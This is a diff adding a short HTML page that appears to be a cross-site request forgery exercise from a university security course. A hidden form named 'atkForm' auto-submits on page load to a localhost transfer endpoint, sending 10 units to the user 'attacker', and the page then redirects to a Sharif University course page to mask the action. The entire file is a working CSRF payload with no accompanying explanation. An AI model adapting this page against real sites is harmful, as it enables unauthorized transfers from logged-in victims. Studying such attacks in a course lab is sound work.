@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <form id="atkForm" action="http://localhost:3000/post_transfer" method="post">
+        <input type="hidden" name="destination_username" value="attacker">
+        <input type="hidden" name="quantity" value="10">
+    </form>
+    <script>
+        window.onload = function(){
+            document.forms['atkForm'].submit();
+            window.location.href = "http://sharif.edu/~kharrazi/courses/40441-011/";
+        }
+    </script>
+</body>
+</html>
